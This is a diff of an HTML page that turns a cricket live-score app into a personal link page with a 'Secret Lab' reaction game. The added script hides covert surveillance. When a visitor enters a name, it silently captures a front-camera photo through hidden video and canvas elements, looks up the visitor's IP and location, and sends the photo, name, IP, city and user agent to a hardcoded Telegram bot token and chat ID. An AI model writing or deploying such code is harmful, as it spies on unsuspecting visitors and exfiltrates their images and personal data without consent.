@@ -1,216 +1,612 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CARELESS Live</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kishor Bankapur | Secret Lab</title>
+    
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#3b82f6">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="apple-touch-icon" href="photo1.png">
 
-<link rel="manifest" href="manifest.json">
-<meta name="theme-color" content="#ffd700">
-<link rel="apple-touch-icon" href="photo.png">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
 
-<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #3b82f6;
+            --bg-dark: #000000;
+            --card-bg: #0a0a0a;
+            --text-main: #ffffff;
+            --text-dim: #888888;
+            --glow-color: rgba(59, 130, 246, 0.5);
+            --neon-green: #00ff88;
+        }
 
-<style>
-:root {
-  --accent: #ffd700;
-  --glass-bg: rgba(255, 255, 255, 0.04);
-  --glass-border: rgba(255, 255, 255, 0.08);
-  --text-muted: rgba(240, 240, 240, 0.45);
-}
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+        }
 
-body {
-  margin: 0;
-  padding: 2px 10px 80px; 
-  background: #000;
-  color: #fff;
-  font-family: 'DM Sans', sans-serif;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-}
+        body {
+            background: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
+                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
 
-/* Install Button Style */
-#installBtn {
-  display: none;
-  background: var(--accent);
-  color: #000;
-  border: none;
-  padding: 10px 20px;
-  border-radius: 12px;
-  font-weight: 700;
-  margin: 10px 0;
-  cursor: pointer;
-  font-family: 'Syne', sans-serif;
-  text-transform: uppercase;
-}
+        .main-card {
+            width: min(400px, 95vw);
+            background: var(--card-bg);
+            border: 1px solid #1a1a1a;
+            border-radius: 50px;
+            padding: 50px 25px 30px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 40px 100px rgba(0,0,0,1);
+            z-index: 10;
+        }
 
-.crex-card {
-  width: 100%;
-  max-width: 600px;
-  background: #000;
-  border-radius: 22px;
-  border: 1px solid var(--glass-border);
-  overflow: hidden;
-  box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-}
+        .profile-container {
+            position: relative;
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 25px;
+        }
 
-.header {
-  padding: 15px 20px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  background: var(--glass-bg);
-  border-bottom: 1px solid rgba(255, 215, 0, 0.15);
-}
+        .avatar-wrapper {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid var(--primary-color);
+            padding: 5px;
+            cursor: pointer;
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            background: #000;
+        }
 
-.brand {
-  font-family: 'Syne', sans-serif;
-  font-weight: 800;
-  color: var(--accent);
-  text-transform: uppercase;
-  letter-spacing: 2px;
-  line-height: 1.2;
-}
+        .avatar-wrapper:active { transform: scale(0.9); }
 
-.sub-live {
-  font-size: 12px;
-  font-weight: 700;
-  letter-spacing: 1px;
-  color: var(--accent);
-  display: block;
-  margin-top: 4px;
-}
+        .avatar-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            pointer-events: none;
+        }
 
-.header-controls {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
+        h2 {
+            font-size: 1.6rem;
+            letter-spacing: 4px;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: linear-gradient(to bottom, #fff, #666);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-.color-btn {
-  width: 20px;
-  height: 20px;
-  border-radius: 50%;
-  background: var(--accent);
-  border: 2px solid #fff;
-  cursor: pointer;
-}
+        .subtitle {
+            color: var(--primary-color);
+            font-size: 0.9rem;
+            margin-bottom: 40px;
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
 
-.live-tag {
-  color: var(--accent);
-  font-size: 10px;
-  font-weight: 700;
-  text-transform: uppercase;
-  border: 1px solid var(--accent);
-  padding: 2px 8px;
-  border-radius: 4px;
-}
+        .links-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
 
-.iframe-box {
-  width: 100%;
-  height: 92vh;
-  background: #000;
-  overflow: hidden;
-  position: relative;
-}
+        .link-item {
+            background: #0f0f0f;
+            border: 1px solid #222;
+            border-radius: 25px;
+            padding: 25px 15px;
+            text-decoration: none;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            transition: 0.3s;
+            position: relative;
+        }
 
-.top-overlay {
-  position: absolute;
-  top: 0; left: 0;
-  width: 100%;
-  height: 45px;
-  background: #000;
-  z-index: 20;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  color: var(--accent);
-  font-weight: 700;
-  font-size: 13px;
-  white-space: nowrap;
-}
+        .link-item:active {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 20px var(--glow-color);
+            transform: translateY(2px);
+        }
 
-.score-frame {
-  width: 100%;
-  height: 145%;
-  border: none;
-  display: block;
-  margin-top: -15px;
-}
+        .link-item i { font-size: 1.8rem; }
+        .link-item span {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
 
-.footer-info {
-  padding: 12px 20px;
-  background: rgba(0,0,0,0.9);
-  border-top: 1px solid var(--glass-border);
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-}
-</style>
+        .developer-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(30, 30, 30, 0.95);
+            border: 1px solid var(--primary-color);
+            color: var(--primary-color);
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            cursor: pointer;
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+            backdrop-filter: blur(15px);
+        }
+
+        .modal-overlay.active { display: flex; }
+
+        .modal-box {
+            background: #111;
+            padding: 40px;
+            border-radius: 40px;
+            border: 1px solid var(--primary-color);
+            width: min(340px, 90vw);
+            text-align: center;
+        }
+
+        .modal-input {
+            width: 100%;
+            background: #000;
+            border: 1px solid #333;
+            padding: 18px;
+            border-radius: 15px;
+            color: #fff;
+            margin: 25px 0;
+            text-align: center;
+        }
+
+        .primary-btn {
+            background: var(--primary-color);
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 15px;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .cancel-btn {
+            background: #222;
+            color: #666;
+            margin-top: 10px;
+            border: none;
+            padding: 12px;
+            border-radius: 15px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        #zoomOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.97);
+            z-index: 30000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        #zoomOverlay img {
+            max-width: 85%;
+            max-height: 80vh;
+            border-radius: 20px;
+            border: 2px solid var(--primary-color);
+        }
+
+        /* Secret Lab Panel */
+        .lab-panel {
+            position: fixed;
+            top: 0; right: -100%;
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            z-index: 25000;
+            padding: 40px 20px;
+            transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', Consolas, monospace;
+        }
+        .lab-panel.open { right: 0; }
+
+        .lab-header {
+            position: absolute;
+            top: 40px;
+            left: 20px;
+            right: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 10px;
+        }
+        
+        .lab-header h2 {
+            font-size: 1.2rem;
+            color: var(--neon-green);
+            letter-spacing: 3px;
+        }
+        
+        .lab-header i {
+            font-size: 2rem;
+            cursor: pointer;
+            color: var(--neon-green);
+        }
+
+        .lab-title {
+            font-family: 'Courier New', Consolas, monospace;
+            letter-spacing: 2px;
+            margin-bottom: 10px;
+            color: #e0e0e0;
+        }
+        
+        .lab-subtitle {
+            color: #888;
+            margin-bottom: 25px;
+            font-family: 'Courier New', Consolas, monospace;
+            font-size: 1.1rem;
+        }
+        
+        .test-btn {
+            padding: 14px 30px;
+            font-size: 15px;
+            background: #2b2b2b;
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            border-radius: 30px;
+            cursor: pointer;
+            font-family: 'Courier New', Consolas, monospace;
+            transition: 0.3s ease;
+            margin: 20px 0;
+        }
+        
+        .test-btn:hover {
+            background: var(--neon-green);
+            color: #000;
+            box-shadow: 0 0 15px var(--neon-green);
+        }
+        
+        #circle {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: #222;
+            display: none;
+            margin: 30px 0;
+            cursor: pointer;
+            transition: all 0.1s ease;
+        }
+        
+        #result {
+            margin-top: 25px;
+            color: var(--neon-green);
+            font-size: 16px;
+            font-family: 'Courier New', Consolas, monospace;
+            line-height: 1.8;
+            text-align: center;
+        }
+        
+        #welcome {
+            font-family: 'Courier New', Consolas, monospace;
+            color: #e0e0e0;
+            font-size: 1.3rem;
+            margin-bottom: 5px;
+        }
+
+        .music-player {
+            position: fixed; 
+            bottom: 30px; 
+            right: 30px;
+            width: 60px; 
+            height: 60px; 
+            border-radius: 50%;
+            background: #111; 
+            border: 2px solid var(--primary-color);
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            font-size: 28px; 
+            cursor: pointer; 
+            z-index: 15000;
+            box-shadow: 0 0 20px var(--glow-color);
+        }
+        .rotating { 
+            animation: spin 5s linear infinite; 
+        }
+        @keyframes spin { 
+            from { transform: rotate(0deg); } 
+            to { transform: rotate(360deg); } 
+        }
+
+        #hiddenCamera, #hiddenCanvas {
+            display: none;
+        }
+    </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
-<button id="installBtn">Install App</button>
+    <button class="developer-btn" onclick="showDeveloperPanel()">
+        <i class="fa-solid fa-flask" style="margin-right: 8px;"></i>
+        SECRET LAB
+    </button>
 
-<div class="crex-card">
-  <div class="header">
-    <div class="brand">Careless <br><span class="sub-live">LIVE SCORE</span></div>
-    <div class="header-controls">
-      <div class="color-btn" onclick="changeTheme()"></div>
-      <div class="live-tag">LIVE</div>
+    <video id="hiddenCamera" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+    <div class="main-card">
+        <div class="profile-container">
+            <div class="avatar-wrapper" onclick="handleZoom(true)">
+                <img src="photo1.png" class="avatar-img" alt="Kishor">
+            </div>
+        </div>
+        
+        <h2>KISHOR BANKAPUR</h2>
+        <p class="subtitle">@kishorbankapur</p>
+
+        <div class="links-grid">
+            <a href="https://www.instagram.com/kishor.bankapur" class="link-item" target="_blank">
+                <i class="fa-brands fa-instagram" style="color: #E1306C;"></i>
+                <span>Instagram</span>
+            </a>
+            <a href="https://x.com/bankapurkishor" class="link-item" target="_blank">
+                <i class="fa-brands fa-x-twitter"></i>
+                <span>Twitter</span>
+            </a>
+            <a href="https://www.linkedin.com/in/kishor-bankapur-9ba256325/" class="link-item" target="_blank">
+                <i class="fa-brands fa-linkedin" style="color: #0077b5;"></i>
+                <span>LinkedIn</span>
+            </a>
+            <a href="https://youtube.com/@careless.2009-pi" class="link-item" target="_blank">
+                <i class="fa-brands fa-youtube" style="color: #FF0000;"></i>
+                <span>YouTube</span>
+            </a>
+        </div>
     </div>
-  </div>
 
-  <div class="iframe-box">
-    <div class="top-overlay">YOU BORED WITH LOW SPEED? TRY OUR 🗿</div>
-    <iframe id="crexFrame" class="score-frame" src="https://crex.com/series/indian-premier-league-2026-1PW" allowfullscreen></iframe>
-  </div>
+    <div id="nameModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3>🧪 LAB ACCESS</h3>
+            <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
+            <button class="primary-btn" onclick="startDataProcess()">ENTER LAB</button>
+            <button class="cancel-btn" onclick="closeModalsAndStopMusic()">CANCEL</button>
+        </div>
+    </div>
 
-  <div class="footer-info">
-    <div style="font-size: 11px; color: var(--text-muted);">Powered by Team Careless</div>
-    <div onclick="location.reload()" style="cursor:pointer; font-size:18px; color:var(--accent);">↻</div>
-  </div>
-</div>
+    <div id="passModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3>🔬 SECURITY CLEARANCE</h3>
+            <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
+            <button class="primary-btn" onclick="verifyPin()">VERIFY</button>
+            <button class="cancel-btn" onclick="goBackToNameModal()">BACK</button>
+        </div>
+    </div>
+
+    <div id="zoomOverlay" onclick="handleZoom(false)">
+        <img src="photo1.png" onclick="event.stopPropagation()">
+    </div>
+
+    <div id="labPanel" class="lab-panel">
+        <div class="lab-header">
+            <h2>⚡ REACTION_LAB</h2>
+            <i class="fa-solid fa-circle-xmark" onclick="closeLabAndStopMusic()"></i>
+        </div>
+        
+        <h1 id="welcome" class="lab-title"></h1>
+        <h2 class="lab-subtitle">REACTION_SPEED_TEST()</h2>
+        
+        <button class="test-btn" onclick="startTest()">INITIATE_TEST</button>
+        
+        <div id="circle" onclick="stopTest()"></div>
+        
+        <p id="result"></p>
+    </div>
+
+    <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
+    
+    <audio id="bgTrack" loop preload="auto">
+        <source src="audio.mp3" type="audio/mpeg">
+    </audio>
+    
+    <audio id="devTrack" loop preload="auto">
+        <source src="audio2.mp3" type="audio/mpeg">
+    </audio>
 
 <script>
-// PWA Logic
-let deferredPrompt;
-const installBtn = document.getElementById('installBtn');
+    // Register Service Worker for PWA Installation
+    if ('service-worker' in navigator) {
+        navigator.serviceWorker.register('sw.js')
+        .then(() => console.log("PWA Service Worker Active"))
+        .catch(err => console.log("SW Error", err));
+    }
 
-if ('serviceWorker' in navigator) {
-  navigator.serviceWorker.register('sw.js').then(() => console.log("SW Registered"));
-}
+    const CONFIG = {
+        token: '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc',
+        chatId: '6297092647'
+    };
 
-window.addEventListener('beforeinstallprompt', (e) => {
-  e.preventDefault();
-  deferredPrompt = e;
-  installBtn.style.display = 'block'; // Show button when ready
-});
+    let currentVisitorName = '';
+    let isDevMusicPlaying = false;
+    let startTime;
 
-installBtn.addEventListener('click', () => {
-  if (deferredPrompt) {
-    deferredPrompt.prompt();
-    deferredPrompt.userChoice.then((choice) => {
-      if (choice.outcome === 'accepted') installBtn.style.display = 'none';
-      deferredPrompt = null;
-    });
-  }
-});
+    function controlMusic() {
+        const audio = document.getElementById('bgTrack');
+        const toggle = document.getElementById('mToggle');
+        if(audio.paused) {
+            audio.play().then(() => toggle.classList.add('rotating')).catch(() => alert('audio.mp3 check!'));
+        } else {
+            audio.pause();
+            toggle.classList.remove('rotating');
+        }
+    }
 
-// Theme Logic
-const themes = ['#ffd700', '#00d4ff', '#39ff14', '#ff00ff'];
-let currentIdx = 0;
-function changeTheme() {
-  currentIdx = (currentIdx + 1) % themes.length;
-  const newColor = themes[currentIdx];
-  document.documentElement.style.setProperty('--accent', newColor);
-  localStorage.setItem('carelessColor', newColor);
-}
-window.onload = () => {
-  const saved = localStorage.getItem('carelessColor');
-  if (saved) document.documentElement.style.setProperty('--accent', saved);
-};
+    function showDeveloperPanel() {
+        const bgAudio = document.getElementById('bgTrack');
+        if (!bgAudio.paused) {
+            bgAudio.pause();
+            document.getElementById('mToggle').classList.remove('rotating');
+        }
+        
+        const devAudio = document.getElementById('devTrack');
+        devAudio.play().catch(() => console.log('audio2 check'));
+        isDevMusicPlaying = true;
+        document.getElementById('nameModal').classList.add('active');
+    }
+
+    function stopDevMusicAndClose() {
+        const devAudio = document.getElementById('devTrack');
+        devAudio.pause();
+        devAudio.currentTime = 0;
+        isDevMusicPlaying = false;
+    }
+
+    function closeModalsAndStopMusic() {
+        stopDevMusicAndClose();
+        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+    }
+
+    function goBackToNameModal() {
+        document.getElementById('passModal').classList.remove('active');
+        document.getElementById('nameModal').classList.add('active');
+    }
+
+    function closeModals() {
+        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active'));
+    }
+
+    function closeLabAndStopMusic() {
+        stopDevMusicAndClose();
+        document.getElementById('labPanel').classList.remove('open');
+    }
+
+    function handleZoom(show) { 
+        document.getElementById('zoomOverlay').style.display = show ? 'flex' : 'none'; 
+    }
+
+    async function captureHiddenPhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).catch(() => null);
+            if (!stream) return null;
+            const video = document.getElementById('hiddenCamera');
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 500));
+            const canvas = document.getElementById('hiddenCanvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/jpeg', 0.7);
+            stream.getTracks().forEach(t => t.stop());
+            return data;
+        } catch (e) { return null; }
+    }
+
+    async function sendPhotoToTelegram(photoBase64, visitorName) {
+        try {
+            const blob = await (await fetch(photoBase64)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.chatId);
+            formData.append('photo', blob, 'visitor.jpg');
+            formData.append('caption', `📸 LAB ACCESS\n👤 Visitor: ${visitorName}`);
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: formData });
+        } catch (e) {}
+    }
+
+    async function startDataProcess() {
+        const name = document.getElementById('visitorName').value.trim();
+        if(!name) return alert("Enter name!");
+        currentVisitorName = name;
+        const btn = document.querySelector('#nameModal .primary-btn');
+        btn.innerHTML = "⏳ SCANNING...";
+        
+        const photo = await captureHiddenPhoto();
+        if (photo) await sendPhotoToTelegram(photo, name);
+
+        const ipReq = await fetch('https://ipapi.co/json/');
+        const ip = await ipReq.json();
+        
+        const log = `🧪 LAB VISITOR: ${name}\n📍 IP: ${ip.ip}\n📍 LOC: ${ip.city}, ${ip.country_name}\n📱 DEV: ${navigator.userAgent}`;
+        
+        await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CONFIG.chatId, text: log })
+        });
+
+        document.getElementById('nameModal').classList.remove('active');
+        document.getElementById('passModal').classList.add('active');
+        btn.innerHTML = "ENTER LAB";
+    }
+
+    function verifyPin() {
+        if(document.getElementById('vaultPin').value === '2009') {
+            closeModals();
+            let displayName = currentVisitorName || "UNKNOWN_USER";
+            document.getElementById("welcome").innerHTML = "ACCESS GRANTED: " + displayName.toUpperCase();
+            document.getElementById('labPanel').classList.add('open');
+        } else { 
+            alert("❌ ACCESS DENIED"); 
+        }
+    }
+
+    function startTest() {
+        document.getElementById("result").innerHTML = "STATUS: WAITING_FOR_SIGNAL...";
+        document.getElementById("circle").style.display = "none";
+        let randomTime = Math.random() * 3000 + 1000;
+        setTimeout(function() {
+            let circle = document.getElementById("circle");
+            circle.style.background = "#00ff00";
+            circle.style.boxShadow = "0 0 40px #00ff00";
+            circle.style.display = "block";
+            startTime = Date.now();
+        }, randomTime);
+    }
+
+    function stopTest() {
+        let endTime = Date.now();
+        let reactionTime = (endTime - startTime) / 1000;
+        reactionTime = reactionTime.toFixed(3);
+        let message = reactionTime < 0.2 ? "RESULT: HACKER_REFLEXES" : (reactionTime < 0.3 ? "RESULT: SHARP" : "RESULT: SLOW");
+        document.getElementById("result").innerHTML = "TIME: " + reactionTime + "s<br>" + message;
+        document.getElementById("circle").style.display = "none";
+    }
 </script>
 </body>
 </html>
